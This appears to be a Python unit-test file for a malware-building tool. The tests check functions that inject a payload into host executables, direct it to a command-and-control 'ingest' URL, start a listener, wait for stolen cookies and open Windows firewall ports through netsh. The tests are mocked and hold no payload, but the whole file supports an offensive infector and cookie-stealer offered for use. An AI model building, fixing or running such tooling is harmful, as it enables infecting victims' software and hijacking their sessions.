import os
import sys
import unittest
from unittest import mock

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

import auto


class TestC2Decisions(unittest.TestCase):
    def test_https_port_rewrite_preserves_scheme_and_path(self):
        self.assertEqual(
            auto._rewrite_c2_port("https://c2.example:443/ingest/v2", 9443),
            "https://c2.example:9443/ingest/v2")

    def test_remote_plain_http_does_not_start_listener(self):
        proc = mock.Mock()
        with mock.patch.object(auto, "ensure_build", return_value=True), \
                mock.patch.object(auto, "start_listener", return_value=proc) as start, \
                mock.patch.object(auto, "check_c2_reachable", return_value=(True, "reachable")), \
                mock.patch.object(auto, "build_infected_standalone", return_value="out.exe") as build, \
                mock.patch.object(auto, "detect_ip", return_value="192.168.1.20"), \
                mock.patch.object(auto, "log"):
            auto.run_one("host.exe", "file", False, 8080, None, None, False,
                         c2_override="http://203.0.113.8:8080/ingest")
        start.assert_not_called()
        self.assertEqual(build.call_args.args[1], "http://203.0.113.8:8080/ingest")

    def test_detected_local_http_retains_direct_listener(self):
        proc = mock.Mock()
        proc.poll.return_value = None
        with mock.patch.object(auto, "ensure_build", return_value=True), \
                mock.patch.object(auto, "start_listener", return_value=proc) as start, \
                mock.patch.object(auto, "check_c2_reachable", return_value=(True, "reachable")), \
                mock.patch.object(auto, "build_infected_standalone", return_value="out.exe"), \
                mock.patch.object(auto, "wait_for_cookies"), \
                mock.patch.object(auto, "detect_ip", return_value="192.168.1.20"), \
                mock.patch.object(auto, "log"):
            auto.run_one("host.exe", "file", False, 8080, None, None, False)
        start.assert_called_once_with(8080, None, None, tunnel=False)


class TestListenerNetwork(unittest.TestCase):
    def test_tunnel_binds_loopback_and_skips_firewall(self):
        probe = mock.Mock()
        proc = mock.Mock(pid=123)
        proc.poll.return_value = None
        with mock.patch.object(auto.sys, "platform", "win32"), \
                mock.patch.object(auto.socket, "socket", return_value=probe), \
                mock.patch.object(auto.subprocess, "Popen", return_value=proc) as popen, \
                mock.patch.object(auto, "_open_firewall_port") as firewall, \
                mock.patch.object(auto, "_listener_health", return_value=True), \
                mock.patch.object(auto, "detect_ip", return_value="192.168.1.20"), \
                mock.patch.object(auto.os, "makedirs"), \
                mock.patch.object(auto.os.path, "exists", return_value=False), \
                mock.patch.object(auto, "log"):
            result = auto.start_listener(9090, tunnel=True)

        self.assertIs(result, proc)
        probe.bind.assert_called_once_with(("127.0.0.1", 9090))
        firewall.assert_not_called()
        command = popen.call_args.args[0]
        self.assertEqual(command[-2:], ["--bind", "127.0.0.1"])

    def test_direct_firewall_failure_is_reported(self):
        probe = mock.Mock()
        proc = mock.Mock(pid=123)
        proc.poll.return_value = None
        with mock.patch.object(auto.sys, "platform", "win32"), \
                mock.patch.object(auto.socket, "socket", return_value=probe), \
                mock.patch.object(auto.subprocess, "Popen", return_value=proc), \
                mock.patch.object(auto, "_open_firewall_port", return_value=False) as firewall, \
                mock.patch.object(auto, "_listener_health", return_value=True), \
                mock.patch.object(auto, "detect_ip", return_value="192.168.1.20"), \
                mock.patch.object(auto.os, "makedirs"), \
                mock.patch.object(auto.os.path, "exists", return_value=False), \
                mock.patch.object(auto, "log") as log:
            auto.start_listener(9090)

        probe.bind.assert_called_once_with(("0.0.0.0", 9090))
        firewall.assert_called_once_with(9090)
        messages = [call.args[0] for call in log.call_args_list]
        self.assertTrue(any("firewall rule failed" in message for message in messages))
        self.assertTrue(any("netsh advfirewall" in message for message in messages))


if __name__ == "__main__":
    unittest.main()
